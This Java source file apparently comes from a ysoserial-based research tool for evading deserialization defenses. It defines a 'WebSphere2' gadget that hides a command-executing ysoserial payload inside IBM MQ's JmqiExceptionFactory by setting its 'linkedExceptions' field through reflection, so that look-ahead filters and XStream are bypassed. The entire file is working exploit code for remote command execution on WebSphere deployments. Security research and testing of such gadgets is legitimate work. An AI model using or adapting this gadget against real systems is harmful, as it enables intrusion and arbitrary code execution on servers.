package serialkiller.bypass;

import com.ibm.mq.jmqi.JmqiExceptionFactory;
import org.objenesis.Objenesis;
import org.objenesis.ObjenesisStd;
import org.objenesis.instantiator.ObjectInstantiator;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import serialkiller.util.Serializables;
import java.util.ArrayList;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "websphere"} )
public class WebSphere2 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Objenesis objenesis = new ObjenesisStd();
        ObjectInstantiator instantiator = objenesis.getInstantiatorOf(JmqiExceptionFactory.class);

        JmqiExceptionFactory exceptionFactory = (JmqiExceptionFactory) instantiator.newInstance();
        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);
        byte[] payload_bytes = Serializables.serialize(payload);
        ArrayList list = new ArrayList();
        list.add(payload_bytes);
        Reflections.setFieldValue(exceptionFactory, "linkedExceptions", list);

        return exceptionFactory;

    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}

